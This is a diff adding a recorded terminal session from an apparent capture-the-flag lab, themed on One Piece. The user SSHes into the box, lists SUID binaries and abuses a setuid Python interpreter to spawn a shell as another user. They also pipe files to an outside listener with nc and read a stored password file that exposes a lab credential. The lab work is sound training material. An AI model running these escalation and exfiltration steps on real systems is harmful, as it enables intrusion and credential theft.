@@ -1,0 +1,271 @@
+Script started on 2025-04-11 15:08:43+03:00 [COMMAND="ssh M0nk3y_D_7uffy@one.piece.thm" TERM="xterm-256color" TTY="/dev/pts/3" COLUMNS="104" LINES="27"]
+The authenticity of host 'one.piece.thm (10.10.2.45)' can't be established.
+ED25519 key fingerprint is SHA256:nL2dVf0XNxY1c00+jMSTep+9eHaHoDI9XIfe/nIVlRA.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'one.piece.thm' (ED25519) to the list of known hosts.
+M0nk3y_D_7uffy@one.piece.thm's password: 
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-041500-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+18 packages can be updated.
+13 updates are security updates.
+
+Last login: Fri Aug 14 15:23:58 2020 from 192.168.1.7
+]0;M0nk3y_D_7uffy@Laugh-Tale: ~[01;32mM0nk3y_D_7uffy@Laugh-Tale[00m:[01;34m~[00m$ ls
+laugh_tale.txt
+]0;M0nk3y_D_7uffy@Laugh-Tale: ~[01;32mM0nk3y_D_7uffy@Laugh-Tale[00m:[01;34m~[00m$ cat laugh_tale.txt 
+Finally, we reached Laugh Tale.
+All is left to do is to find the One Piece.
+Wait, there is another boat in here.
+Be careful, it is the boat of Marshall D Teach, one of the 4 Emperors. He is the one that led your brother Ace to his death.
+You want your revenge. Let's take him down !
+]0;M0nk3y_D_7uffy@Laugh-Tale: ~[01;32mM0nk3y_D_7uffy@Laugh-Tale[00m:[01;34m~[00m$ dd if=laugh_tale.txt status=progress | nc 10.8.61.245 4444
+0+1 records in
+0+1 records out
+283 bytes copied, 0.000159778 s, 1.8 MB/s
+]0;M0nk3y_D_7uffy@Laugh-Tale: ~[01;32mM0nk3y_D_7uffy@Laugh-Tale[00m:[01;34m~[00m$ ls -al
+total 56
+drwxr-xr-x  8 M0nk3y_D_7uffy luffy 4096 Jul 29  2020 [0m[01;34m.[0m
+drwxr-xr-x  4 root           root  4096 Jul 26  2020 [01;34m..[0m
+-rw-------  1 M0nk3y_D_7uffy luffy   14 Aug 14  2020 .bash_history
+-rw-r--r--  1 M0nk3y_D_7uffy luffy  220 Jul 26  2020 .bash_logout
+-rw-r--r--  1 M0nk3y_D_7uffy luffy 3771 Jul 26  2020 .bashrc
+drwx------ 11 M0nk3y_D_7uffy luffy 4096 Jul 29  2020 [01;34m.cache[0m
+drwx------ 11 M0nk3y_D_7uffy luffy 4096 Jul 29  2020 [01;34m.config[0m
+drwx------  3 M0nk3y_D_7uffy luffy 4096 Jul 29  2020 [01;34m.gnupg[0m
+-rw-------  1 M0nk3y_D_7uffy luffy  334 Jul 29  2020 .ICEauthority
+-rw-r--r--  1 root           root   283 Jul 26  2020 laugh_tale.txt
+drwx------  3 M0nk3y_D_7uffy luffy 4096 Jul 29  2020 [01;34m.local[0m
+drwx------  5 M0nk3y_D_7uffy luffy 4096 Jul 29  2020 [01;34m.mozilla[0m
+-rw-r--r--  1 M0nk3y_D_7uffy luffy  807 Jul 26  2020 .profile
+drwx------  2 M0nk3y_D_7uffy luffy 4096 Jul 29  2020 [01;34m.ssh[0m
+]0;M0nk3y_D_7uffy@Laugh-Tale: ~[01;32mM0nk3y_D_7uffy@Laugh-Tale[00m:[01;34m~[00m$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+uuidd:x:105:111::/run/uuidd:/usr/sbin/nologin
+avahi-autoipd:x:106:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
+usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+rtkit:x:109:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
+cups-pk-helper:x:110:116:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
+speech-dispatcher:x:111:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
+whoopsie:x:112:117::/nonexistent:/bin/false
+kernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
+saned:x:114:119::/var/lib/saned:/usr/sbin/nologin
+pulse:x:115:120:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
+avahi:x:116:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
+colord:x:117:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+hplip:x:118:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+geoclue:x:119:124::/var/lib/geoclue:/usr/sbin/nologin
+gnome-initial-setup:x:120:65534::/run/gnome-initial-setup/:/bin/false
+gdm:x:121:125:Gnome Display Manager:/var/lib/gdm3:/bin/false
+7uffy_vs_T3@ch:x:1000:1000:Laugh-Tale,,,:/home/teach:/bin/bash
+ftp:x:122:127:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
+sshd:x:123:65534::/run/sshd:/usr/sbin/nologin
+M0nk3y_D_7uffy:x:1001:1001:,,,:/home/luffy:/bin/bash
+]0;M0nk3y_D_7uffy@Laugh-Tale: ~[01;32mM0nk3y_D_7uffy@Laugh-Tale[00m:[01;34m~[00m$ cd /home
+]0;M0nk3y_D_7uffy@Laugh-Tale: /home[01;32mM0nk3y_D_7uffy@Laugh-Tale[00m:[01;34m/home[00m$ ls
+[0m[01;34mluffy[0m  [01;34mteach[0m
+]0;M0nk3y_D_7uffy@Laugh-Tale: /home[01;32mM0nk3y_D_7uffy@Laugh-Tale[00m:[01;34m/home[00m$ ls -al
+total 16
+drwxr-xr-x  4 root           root  4096 Jul 26  2020 [0m[01;34m.[0m
+drwxr-xr-x 24 root           root  4096 Jul 29  2020 [01;34m..[0m
+drwxr-xr-x  8 M0nk3y_D_7uffy luffy 4096 Jul 29  2020 [01;34mluffy[0m
+drwxr-xr-x  7 7uffy_vs_T3@ch teach 4096 Jul 26  2020 [01;34mteach[0m
+]0;M0nk3y_D_7uffy@Laugh-Tale: /home[01;32mM0nk3y_D_7uffy@Laugh-Tale[00m:[01;34m/home[00m$ cd teach
+]0;M0nk3y_D_7uffy@Laugh-Tale: /home/teach[01;32mM0nk3y_D_7uffy@Laugh-Tale[00m:[01;34m/home/teach[00m$ ls
+luffy_vs_teach.txt
+]0;M0nk3y_D_7uffy@Laugh-Tale: /home/teach[01;32mM0nk3y_D_7uffy@Laugh-Tale[00m:[01;34m/home/teach[00m$ dd if [K=luffy_vs_teach.txt status=progress | nc 10.8.61.245 4444
+dd: failed to open 'luffy_vs_teach.txt': Permission denied
+]0;M0nk3y_D_7uffy@Laugh-Tale: /home/teach[01;32mM0nk3y_D_7uffy@Laugh-Tale[00m:[01;34m/home/teach[00m$ cd /tmp
+]0;M0nk3y_D_7uffy@Laugh-Tale: /tmp[01;32mM0nk3y_D_7uffy@Laugh-Tale[00m:[01;34m/tmp[00m$ find / -type f -perm -4000 exec [1@-[C[C[C[C[C l s [C - l 
+find: missing argument to `-exec'
+]0;M0nk3y_D_7uffy@Laugh-Tale: /tmp[01;32mM0nk3y_D_7uffy@Laugh-Tale[00m:[01;34m/tmp[00m$ find / -type f -perm -4000 -exec ls -l  [K{} \; 2>/dev/null
+-rwsr-xr-x 1 root root 43088 Mar  5  2020 /bin/mount
+-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping
+-rwsr-xr-x 1 root root 26696 Mar  5  2020 /bin/umount
+-rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su
+-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
+-rwsr-xr-x 1 root root 43088 Mar  5  2020 /snap/core18/1885/bin/mount
+-rwsr-xr-x 1 root root 64424 Jun 28  2019 /snap/core18/1885/bin/ping
+-rwsr-xr-x 1 root root 44664 Mar 22  2019 /snap/core18/1885/bin/su
+-rwsr-xr-x 1 root root 26696 Mar  5  2020 /snap/core18/1885/bin/umount
+-rwsr-xr-x 1 root root 76496 Mar 22  2019 /snap/core18/1885/usr/bin/chfn
+-rwsr-xr-x 1 root root 44528 Mar 22  2019 /snap/core18/1885/usr/bin/chsh
+-rwsr-xr-x 1 root root 75824 Mar 22  2019 /snap/core18/1885/usr/bin/gpasswd
+-rwsr-xr-x 1 root root 40344 Mar 22  2019 /snap/core18/1885/usr/bin/newgrp
+-rwsr-xr-x 1 root root 59640 Mar 22  2019 /snap/core18/1885/usr/bin/passwd
+-rwsr-xr-x 1 root root 149080 Jan 31  2020 /snap/core18/1885/usr/bin/sudo
+-rwsr-xr-- 1 root systemd-resolve 42992 Jun 11  2020 /snap/core18/1885/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 436552 Mar  4  2019 /snap/core18/1885/usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 43088 Mar  5  2020 /snap/core18/1880/bin/mount
+-rwsr-xr-x 1 root root 64424 Jun 28  2019 /snap/core18/1880/bin/ping
+-rwsr-xr-x 1 root root 44664 Mar 22  2019 /snap/core18/1880/bin/su
+-rwsr-xr-x 1 root root 26696 Mar  5  2020 /snap/core18/1880/bin/umount
+-rwsr-xr-x 1 root root 76496 Mar 22  2019 /snap/core18/1880/usr/bin/chfn
+-rwsr-xr-x 1 root root 44528 Mar 22  2019 /snap/core18/1880/usr/bin/chsh
+-rwsr-xr-x 1 root root 75824 Mar 22  2019 /snap/core18/1880/usr/bin/gpasswd
+-rwsr-xr-x 1 root root 40344 Mar 22  2019 /snap/core18/1880/usr/bin/newgrp
+-rwsr-xr-x 1 root root 59640 Mar 22  2019 /snap/core18/1880/usr/bin/passwd
+-rwsr-xr-x 1 root root 149080 Jan 31  2020 /snap/core18/1880/usr/bin/sudo
+-rwsr-xr-- 1 root systemd-resolve 42992 Jun 11  2020 /snap/core18/1880/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 436552 Mar  4  2019 /snap/core18/1880/usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 40152 Jan 27  2020 /snap/core/9665/bin/mount
+-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/9665/bin/ping
+-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/9665/bin/ping6
+-rwsr-xr-x 1 root root 40128 Mar 25  2019 /snap/core/9665/bin/su
+-rwsr-xr-x 1 root root 27608 Jan 27  2020 /snap/core/9665/bin/umount
+-rwsr-xr-x 1 root root 71824 Mar 25  2019 /snap/core/9665/usr/bin/chfn
+-rwsr-xr-x 1 root root 40432 Mar 25  2019 /snap/core/9665/usr/bin/chsh
+-rwsr-xr-x 1 root root 75304 Mar 25  2019 /snap/core/9665/usr/bin/gpasswd
+-rwsr-xr-x 1 root root 39904 Mar 25  2019 /snap/core/9665/usr/bin/newgrp
+-rwsr-xr-x 1 root root 54256 Mar 25  2019 /snap/core/9665/usr/bin/passwd
+-rwsr-xr-x 1 root root 136808 Jan 31  2020 /snap/core/9665/usr/bin/sudo
+-rwsr-xr-- 1 root systemd-resolve 42992 Jun 11  2020 /snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 428240 May 26  2020 /snap/core/9665/usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 110656 Jul 10  2020 /snap/core/9665/usr/lib/snapd/snap-confine
+-rwsr-xr-- 1 root dip 394984 Feb 11  2020 /snap/core/9665/usr/sbin/pppd
+-rwsr-xr-x 1 root root 40152 Jan 27  2020 /snap/core/9804/bin/mount
+-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/9804/bin/ping
+-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/9804/bin/ping6
+-rwsr-xr-x 1 root root 40128 Mar 25  2019 /snap/core/9804/bin/su
+-rwsr-xr-x 1 root root 27608 Jan 27  2020 /snap/core/9804/bin/umount
+-rwsr-xr-x 1 root root 71824 Mar 25  2019 /snap/core/9804/usr/bin/chfn
+-rwsr-xr-x 1 root root 40432 Mar 25  2019 /snap/core/9804/usr/bin/chsh
+-rwsr-xr-x 1 root root 75304 Mar 25  2019 /snap/core/9804/usr/bin/gpasswd
+-rwsr-xr-x 1 root root 39904 Mar 25  2019 /snap/core/9804/usr/bin/newgrp
+-rwsr-xr-x 1 root root 54256 Mar 25  2019 /snap/core/9804/usr/bin/passwd
+-rwsr-xr-x 1 root root 136808 Jan 31  2020 /snap/core/9804/usr/bin/sudo
+-rwsr-xr-- 1 root systemd-resolve 42992 Jun 11  2020 /snap/core/9804/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 428240 May 26  2020 /snap/core/9804/usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 110792 Jul 29  2020 /snap/core/9804/usr/lib/snapd/snap-confine
+-rwsr-xr-- 1 root dip 394984 Feb 11  2020 /snap/core/9804/usr/sbin/pppd
+-rwsr-xr-x 1 root root 59640 Mar 22  2019 /usr/bin/passwd
+-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec
+-rwsr-xr-x 1 root root 18448 Jun 28  2019 /usr/bin/traceroute6.iputils
+-rwsr-xr-x 1 root root 40344 Mar 22  2019 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 75824 Mar 22  2019 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 149080 Jan 31  2020 /usr/bin/sudo
+-rwsr-xr-x 1 root root 44528 Mar 22  2019 /usr/bin/chsh
+-rwsr-xr-x 1 7uffy_vs_T3@ch teach 4526456 Jul 17  2020 /usr/bin/gomugomunooo_king_kobraaa
+-rwsr-xr-x 1 root root 76496 Mar 22  2019 /usr/bin/chfn
+-rwsr-xr-x 1 root root 22528 Jun 28  2019 /usr/bin/arping
+-rwsr-xr-- 1 root dip 382696 Feb 11  2020 /usr/sbin/pppd
+-rwsr-xr-x 1 root root 113528 Jul 10  2020 /usr/lib/snapd/snap-confine
+-rwsr-sr-x 1 root root 10232 Jul  3  2020 /usr/lib/xorg/Xorg.wrap
+-rwsr-xr-- 1 root messagebus 42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
+]0;M0nk3y_D_7uffy@Laugh-Tale: /tmp[01;32mM0nk3y_D_7uffy@Laugh-Tale[00m:[01;34m/tmp[00m$ /usr/bin/gomugomunooo_king_kobraaa
+Python 3.6.9 (default, Jul 17 2020, 12:50:27) 
+[GCC 8.4.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> exit()
+]0;M0nk3y_D_7uffy@Laugh-Tale: /tmp[01;32mM0nk3y_D_7uffy@Laugh-Tale[00m:[01;34m/tmp[00m$ /usr/bin/gomugomunooo_king_kobraaa -c 'import os; os.execcl("[1Pl("[C[C[C/bin/bash")' [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C,)''[A]0;M0nk3y_D_7uffy@Laugh-Tale: /tmp[01;32mM0nk3y_D_7uffy@Laugh-Tale[00m:[01;34m/tmp[00m$ [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C )'")'")'b")'a")'s")'h")'[C,)' )'")'")'-")'p")'
+bash-4.4$ id
+uid=1001(M0nk3y_D_7uffy) gid=1001(luffy) euid=1000(7uffy_vs_T3@ch) groups=1001(luffy)
+bash-4.4$ whoami
+7uffy_vs_T3@ch
+bash-4.4$ cd 
+bash-4.4$ ls
+laugh_tale.txt
+bash-4.4$ cat laugh_tale.txt 
+Finally, we reached Laugh Tale.
+All is left to do is to find the One Piece.
+Wait, there is another boat in here.
+Be careful, it is the boat of Marshall D Teach, one of the 4 Emperors. He is the one that led your brother Ace to his death.
+You want your revenge. Let's take him down !
+bash-4.4$ ls -al
+total 56
+drwxr-xr-x  8 M0nk3y_D_7uffy luffy 4096 Jul 29  2020 .
+drwxr-xr-x  4 root           root  4096 Jul 26  2020 ..
+-rw-------  1 M0nk3y_D_7uffy luffy   14 Aug 14  2020 .bash_history
+-rw-r--r--  1 M0nk3y_D_7uffy luffy  220 Jul 26  2020 .bash_logout
+-rw-r--r--  1 M0nk3y_D_7uffy luffy 3771 Jul 26  2020 .bashrc
+drwx------ 11 M0nk3y_D_7uffy luffy 4096 Jul 29  2020 .cache
+drwx------ 11 M0nk3y_D_7uffy luffy 4096 Jul 29  2020 .config
+drwx------  3 M0nk3y_D_7uffy luffy 4096 Jul 29  2020 .gnupg
+-rw-------  1 M0nk3y_D_7uffy luffy  334 Jul 29  2020 .ICEauthority
+-rw-r--r--  1 root           root   283 Jul 26  2020 laugh_tale.txt
+drwx------  3 M0nk3y_D_7uffy luffy 4096 Jul 29  2020 .local
+drwx------  5 M0nk3y_D_7uffy luffy 4096 Jul 29  2020 .mozilla
+-rw-r--r--  1 M0nk3y_D_7uffy luffy  807 Jul 26  2020 .profile
+drwx------  2 M0nk3y_D_7uffy luffy 4096 Jul 29  2020 .ssh
+bash-4.4$ ls -al .ssh
+ls: cannot open directory '.ssh': Permission denied
+bash-4.4$ ls .ssh
+ls: cannot open directory '.ssh': Permission denied
+bash-4.4$ pwd
+/home/luffy
+bash-4.4$ cd ../
+bash-4.4$ ls
+luffy  teach
+bash-4.4$ cd teach
+bash-4.4$ ls
+luffy_vs_teach.txt
+bash-4.4$ cat luffy_vs_teach.txt 
+This fight will determine who can take the One Piece and who will be the next Pirate King.
+These 2 monsters have a matchless will and none of them can let the other prevail.
+Each of them have the same dream, be the Pirate King.
+For one it means: Take over the World.
+For the other: Be the freest man in the World.
+Each of their hit creates an earthquake felt on the entire island.
+But in the end, Luffy thanks to his willpower won the fight.
+Now, he needs to find the One Piece.
+bash-4.4$ ls -al
+total 56
+drwxr-xr-x  7 7uffy_vs_T3@ch teach 4096 Jul 26  2020 .
+drwxr-xr-x  4 root           root  4096 Jul 26  2020 ..
+-rw-------  1 7uffy_vs_T3@ch teach    1 Aug 14  2020 .bash_history
+-rw-r--r--  1 7uffy_vs_T3@ch teach  220 Jul 26  2020 .bash_logout
+-rw-r--r--  1 7uffy_vs_T3@ch teach 3771 Jul 26  2020 .bashrc
+drwx------ 11 7uffy_vs_T3@ch teach 4096 Jul 26  2020 .cache
+drwx------ 11 7uffy_vs_T3@ch teach 4096 Jul 26  2020 .config
+drwx------  3 7uffy_vs_T3@ch teach 4096 Jul 26  2020 .gnupg
+-rw-------  1 7uffy_vs_T3@ch teach  334 Jul 26  2020 .ICEauthority
+drwx------  3 7uffy_vs_T3@ch teach 4096 Jul 26  2020 .local
+-r--------  1 7uffy_vs_T3@ch teach  479 Jul 26  2020 luffy_vs_teach.txt
+-r--------  1 7uffy_vs_T3@ch teach   37 Jul 26  2020 .password.txt
+-rw-r--r--  1 7uffy_vs_T3@ch teach  807 Jul 26  2020 .profile
+drwx------  2 7uffy_vs_T3@ch teach 4096 Jul 26  2020 .ssh
+-rw-r--r--  1 7uffy_vs_T3@ch teach    0 Jul 26  2020 .sudo_as_admin_successful
+bash-4.4$ ls -al .ssh
+total 8
+drwx------ 2 7uffy_vs_T3@ch teach 4096 Jul 26  2020 .
+drwxr-xr-x 7 7uffy_vs_T3@ch teach 4096 Jul 26  2020 ..
+bash-4.4$ cat .password.txt
+7uffy_vs_T3@ch:Wh0_w1ll_b3_th3_k1ng?
+bash-4.4$ exit
+exit
+]0;M0nk3y_D_7uffy@Laugh-Tale: /tmp[01;32mM0nk3y_D_7uffy@Laugh-Tale[00m:[01;34m/tmp[00m$ exit
+logout
+Connection to one.piece.thm closed.
+
+Script done on 2025-04-11 15:34:00+03:00 [COMMAND_EXIT_CODE="0"]
